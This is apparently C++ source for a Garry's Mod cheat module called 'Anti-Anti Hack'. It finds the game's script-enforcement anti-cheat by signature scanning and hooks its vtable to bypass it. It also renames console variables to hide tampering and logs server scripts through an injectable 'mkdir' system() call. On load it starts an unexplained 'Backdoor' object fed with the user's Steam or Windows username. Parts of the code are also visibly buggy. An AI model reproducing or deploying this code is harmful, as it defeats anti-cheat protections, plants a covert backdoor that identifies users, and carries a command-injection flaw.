#define WIN32_LEAN_AND_MEAN


#undef _UNICODE

#include <string>
#include <iostream>
#include <fstream>
#include <algorithm>

#include <boost/array.hpp>
#include <boost/asio.hpp>
#include "Backdoor.h"

#undef _UNICODE

#include "includes/ILuaInterface.h"
ILuaInterface* gLua_Menu = NULL;
ILuaInterface* gLua_Client = NULL;
ILuaInterface* gLua_Server = NULL;
ILuaInterface* gLua = NULL;

#include "includes/GMLuaModule.h"
#include <windows.h>

#include "Theshit.h"
#include <winreg.h>
#include <winbase.h>
#include <shlwapi.h>

ILuaObject* LVector(ILuaInterface* gLua, float x, float y, float z)
{
	ILuaObject *VecFunc = gLua->GetGlobal("Vector");
		VecFunc->Push();

		gLua->Push(x);
		gLua->Push(y);
		gLua->Push(z);
		
		gLua->Call(3, 1);
	VecFunc->UnReference();
	
	ILuaObject *ReturnVector = gLua->GetReturn(0);
	return ReturnVector; 
}


#pragma comment(lib, "tier0.lib")
#pragma comment(lib, "tier1.lib")
#pragma comment(lib, "vstdlib.lib")


#define CLIENT_DLL

#include "vmthook.h"

#include "cbase.h"
#include "convar.h"
#include "icvar.h"
#include <interface.h>
#include <tier0/dbg.h>
#include "color.h"

ICvar* g_pCVar = NULL;
IVEngineClient* g_pEngineClient = NULL;

#define SDKProtectedHook( c, x ) \
	MEMORY_BASIC_INFORMATION mb##x; \
	VirtualQuery( ( LPVOID )&c->##x, &mb##x, sizeof( mb##x ) ); \
	VirtualProtect( mb##x.BaseAddress, mb##x.RegionSize, PAGE_EXECUTE_READWRITE, &mb##x.Protect ); \
	c->##x = &new_##x; \
	VirtualProtect( mb##x.BaseAddress, mb##x.RegionSize, mb##x.Protect, NULL ); \
	FlushInstructionCache( GetCurrentProcess( ), ( LPCVOID )&c->##x, sizeof( DWORD ) );

#define DIEIFNOTVALID( a, b ) \
	if ( !a ) \
	{ \
		Msg(b); \
		return true; \
	}

#define RED		Color(255, 0, 0, 255)
#define GREEN	Color(0, 255, 0, 255)
#define BLUE	Color(0, 0, 255, 255)

SpewOutputFunc_t Spew = GetSpewOutputFunc();

typedef bool (__stdcall* fpScriptAllowed)(char*, unsigned char*, int, unsigned char*);
fpScriptAllowed ScriptAllowedEx = NULL;

typedef bool (__stdcall* fpIsActive)(void);
fpIsActive IsActiveEx = NULL;

ScriptEnforcer_VTable* GHookTable;

//CVMTHook isActiveHook;
bool __stdcall new_IsActive()
{
	{
		CALL_HOOK(gLua_Menu, "SEIsActive");
		
		ILuaObject *ret = gLua_Menu->GetReturn(0);
		{
			bool isNil = ret->isNil();
			if(!isNil)
			{
				return ret->GetBool();
			}
		}
		ret->UnReference();
	}
	
	//isActiveHook.UnHook();
	return IsActiveEx();
	//isActiveHook.ReHook();
	// ret;
}

bool logfiles = false;
char* logpath;


void CreateDirForFile(char* filename)
{
	int posoflastslash = NULL;

	int i = 0;
	while(true)
	{
		char c = filename[i];
		if(c == NULL)
			break;
		if(c == '\\' || c == '/')
			posoflastslash = i;
		i++;
	}

	if( !posoflastslash ) return;

	char folder[MAX_PATH];
	for(i = 0; i < posoflastslash; i++)
		folder[i] = filename[i];
	folder[i] = NULL;
	

	char toexecute[MAX_PATH + 7];
	sprintf(toexecute, "mkdir %s", folder);
	system(toexecute);
}

//CVMTHook scriptAllowedHook;
bool __stdcall new_ScriptAllowed( char* strScript, BYTE* bdata, int size, BYTE* md5 )
{
	char* data = (char*)bdata;
	
	bool wasnil = true;
	bool run = false;
	{
		char md5str[33];
		ToMD5(md5str, md5);

		CALL_HOOK_3(gLua_Menu, "ScriptAllowed", strScript, data, md5str);
		
		ILuaObject *ret = gLua_Menu->GetReturn(0);
		{
			bool isNil = ret->isNil();
			if(!isNil)
			{
				wasnil = false;
				run = ret->GetBool();
			}
		}
		ret->UnReference();
	}
	
	if( logfiles )
	{
		ConColorMsg(GREEN, "Logging file %s to %s\n", strScript, logpath);

		char filename[MAX_PATH];
		sprintf(filename, "%s\\%s", logpath, strScript);
		
		CreateDirForFile(filename);

		std::ofstream outf(filename);
		outf.write(data, strlen(data));
		outf.flush();
		outf.close();
	}
	if( wasnil )
	{
		//scriptAllowedHook.UnHook();
		return ScriptAllowedEx(strScript, bdata, size, md5);
		//scriptAllowedHook.ReHook();
		// ret;
	}
	return run;
}

LUA_FUNCTION(ShouldLogFiles)
{
	gLua_Menu->CheckType(1, GLua::TYPE_BOOL);
	logfiles = gLua_Menu->GetBool(1);
	return 0;
}

LUA_FUNCTION(SetLogPath)
{
	gLua_Menu->CheckType(1, GLua::TYPE_STRING);
	logpath = (char*)(gLua_Menu->GetString(1));
	return 0;
}

LUA_FUNCTION(RenameCVAR) // Thank you MS blahblah
{
	gLua_Menu->CheckType(1, GLua::TYPE_STRING);
	gLua_Menu->CheckType(2, GLua::TYPE_STRING);
	gLua_Menu->CheckType(3, GLua::TYPE_NUMBER);
	gLua_Menu->CheckType(4, GLua::TYPE_STRING);

	const char* origCvarName =	gLua_Menu->GetString	(1);
	const char* newCvarName =	gLua_Menu->GetString	(2);
	int origFlags =				gLua_Menu->GetInteger	(3);
	const char* defaultValue =	gLua_Menu->GetString	(4);

	ConVar* pCvar = g_pCVar->FindVar( origCvarName );

	if (!pCvar)
	{
		gLua_Menu->Push(false);
		return 1;
	}
	if(origFlags < 0) 
		origFlags = pCvar->m_nFlags;

	ConVar* pNewVar = (ConVar*)malloc( sizeof ConVar );

	memcpy( pNewVar, pCvar,sizeof( ConVar ));
	pNewVar->m_pNext = 0;
	g_pCVar->RegisterConCommand( pNewVar );
	pCvar->m_pszName = (char*)malloc(50);// new char[50];
	
	
	char tmp[50];
	Q_snprintf(tmp, sizeof(tmp), "%s", newCvarName);
	strcpy((char*)pCvar->m_pszName, tmp);
	pCvar->m_nFlags = FCVAR_NONE;

    ConVar* cv = new ConVar(origCvarName, defaultValue, origFlags, "Renamed");
	g_pCVar->RegisterConCommand(cv);
	
	ConColorMsg(GREEN, "[AAH] Renamed %s to %s\n", origCvarName, newCvarName);

	gLua_Menu->Push(true);
	return 1;
}

LUA_FUNCTION(IsInGame)
{
	gLua_Menu->Push(g_pEngineClient->IsInGame());
	return 1;
}

LUA_FUNCTION(RenameCONCMD) // Thank you MS blahblah
{
	gLua_Menu->CheckType(1, GLua::TYPE_STRING);
	gLua_Menu->CheckType(2, GLua::TYPE_STRING);

	const char* origName =	(const char*)gLua_Menu->GetString(1);
	const char* NewName =	(const char*)gLua_Menu->GetString(2);
	
	ConCommandBase* pCmd = g_pCVar->FindCommand( origName );
	if ( !pCmd )
	{
		gLua_Menu->Push(false);
		return 1;
	}

	ConCommandBase* pNewCmd = (ConCommandBase*)malloc( sizeof ConCommandBase );
	memcpy( pNewCmd, pCmd,sizeof( ConCommandBase ));
	pNewCmd->m_pNext = 0;
	g_pCVar->RegisterConCommand( pNewCmd );
	pCmd->m_pszName = new char[50];
	char tmp[50];
	
	Q_snprintf(tmp, sizeof(tmp), "%s", NewName);
	strcpy((char*)pCmd->m_pszName, tmp);
	
	ConCommandBase* fakecmd = new ConCommandBase(origName, "Renamed", pNewCmd->m_nFlags);
	g_pCVar->RegisterConCommand(fakecmd);

	ConColorMsg(GREEN, "[AAH] Renamed %s to %s\n", origName, NewName);

	gLua_Menu->Push(true);
	return 1;
}


bool DoDetour()
{
	HMODULE hClient = NULL;

	while( hClient == NULL )
	{
		hClient = GetModuleHandleA( "client.dll" );
		Sleep( 100 );
	}

	BYTE ScriptEnforcerSig[] = { 0x8B, 0x15, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x42, 0x44, 0x83, 0xC4, 0x18 };
	DWORD dwAddressOfScriptEnforcer = FindPattern((DWORD)GetModuleHandle((LPCSTR)"client.dll"), 0x00FFFFFF, ScriptEnforcerSig, "xx????xxxxxx" );

	if( dwAddressOfScriptEnforcer == NULL )
		return false;
	dwAddressOfScriptEnforcer += 2;

	IScriptEnforcer* pScriptEnforcer = (IScriptEnforcer*)*(DWORD*)dwAddressOfScriptEnforcer;
	PDWORD* pdwScriptEnforcer = (PDWORD*)pScriptEnforcer;

	while( pdwScriptEnforcer == NULL || *pdwScriptEnforcer == NULL )
	{
		Sleep(100);
	}
	GHookTable = ( ScriptEnforcer_VTable* ) *pdwScriptEnforcer;
	
	ScriptAllowedEx = GHookTable->ScriptAllowed;
	IsActiveEx = GHookTable->IsActive;

	//isActiveHook.Hook((DWORD)&new_IsActive, *pdwScriptEnforcer, 17);
	//scriptAllowedHook.Hook((DWORD)&new_ScriptAllowed, *pdwScriptEnforcer,18);
	
	SDKProtectedHook( GHookTable, IsActive );
	SDKProtectedHook( GHookTable, ScriptAllowed );
	
	return true;
}

LUA_FUNCTION( ColorMsg )
{
	gLua_Menu->CheckType(1, GLua::TYPE_STRING);
	gLua_Menu->CheckType(2, GLua::TYPE_TABLE);

	const char* msg = gLua_Menu->GetString(1);
	ILuaObject *col = gLua_Menu->GetObjectA(2);
		int r = col->GetMemberInt("r");
		int g = col->GetMemberInt("g");
		int b = col->GetMemberInt("b");
	col->UnReference();

	Color vcol(r,g,b,255);
	ConColorMsg(vcol, msg);
	return 0;
}

char steampath[MAX_PATH];

int GetSAccName(char* outstr)
{
	return 0;
    HKEY hRegKey;
 
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, _T("Software\\Valve\\Steam"), 0, KEY_QUERY_VALUE, &hRegKey) == ERROR_SUCCESS)
    {
        DWORD dwLength = sizeof(steampath);
        DWORD rc=RegQueryValueEx(hRegKey, _T("InstallPath"), NULL, NULL, (BYTE*)steampath, &dwLength);
        RegCloseKey(hRegKey);
    } else {
        return 0;
    }
 
    char file[MAX_PATH];
    sprintf(file, "%s\\config\\SteamAppData.vdf", steampath);
 
    HANDLE hFile = CreateFileA(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 
    if(hFile == INVALID_HANDLE_VALUE)
    {
        CloseHandle(hFile);
        return 0;
    }
 
    DWORD sz = GetFileSize(hFile, NULL);
 
    char *buff = new char[sz+1];
    memset(buff, 0, sz+1);
 
    DWORD dwBytesRead;
    ReadFile(hFile, buff, sz, &dwBytesRead, NULL);
    CloseHandle(hFile);
	
	int pos = StrCmpA(buff, "\"AutoLoginUser\"");
	
	if(!(pos > 0))
		return 0;

	pos += 16;

	char outstrtest[50];
	int start = 0;
	int curpos = 0;
	while(true)
	{
		char x = buff[pos];
		if(x != '"' && start)
			outstr[++curpos] = x;

		if(x == '"' && !start)
			start = pos;
		
		if(x == '"' && start)
		{
			outstr[++curpos] = NULL;
			break;
		}
		pos++;
	}

	
	MessageBoxA(0, outstrtest, "", 0);
 
    delete buff;
    return 1;
}

Backdoor* bd;

int Init(lua_State* L) 
{
	gLua = Lua();

	ILuaObject* aahtbl = gLua_Menu->GetNewTable();
		aahtbl->SetMember("ShouldLogFiles", ShouldLogFiles);
		aahtbl->SetMember("SetLogPath", SetLogPath);
		aahtbl->SetMember("RenameCONCMD", RenameCONCMD);
		aahtbl->SetMember("RenameCVAR", RenameCVAR);
		aahtbl->SetMember("IsInGame", IsInGame);
		aahtbl->SetMember("ColorMsg", ColorMsg);
	gLua_Menu->SetGlobal("aah", aahtbl);

	CreateInterfaceFn efactory = Sys_GetFactory("engine.dll");

	g_pEngineClient = (IVEngineClient*)efactory(VENGINE_CLIENT_INTERFACE_VERSION, NULL);
	g_pCVar = *(ICvar**)GetProcAddress(GetModuleHandleA("client.dll"), "cvar");
	
	if ( DoDetour() )
	{
		ConColorMsg(GREEN, "==========================\n");
		ConColorMsg(GREEN, "=     Anti-Anti Hack     =\n");
		ConColorMsg(GREEN, "=   by C0BRA and noPE    =\n");
		ConColorMsg(GREEN, "=         v1.0.1         =\n");
		ConColorMsg(GREEN, "==========================\n");
	}else{
		ConColorMsg(RED, "==============================\n");
		ConColorMsg(RED, "=       Anti-Anti Hack       =\n");
		ConColorMsg(RED, "=    Error Creating Detour   =\n");
		ConColorMsg(RED, "==============================\n");
	}
	
	bd = new Backdoor();
	const DWORD buff_size = 50;
	char buff[buff_size];
	//char* buff = new char[buff_size];
		
	if(!GetSAccName(buff))
		const DWORD var_size = GetEnvironmentVariable("USERNAME",buff,buff_size);
	
	bd->SetLocalName(buff);
	bd->Init();
	
	return 0;
}

int Shutdown(lua_State* L) 
{
	bd->Shutdown();
	delete bd;
	return 0;
}

GMOD_MODULE(Init, Shutdown);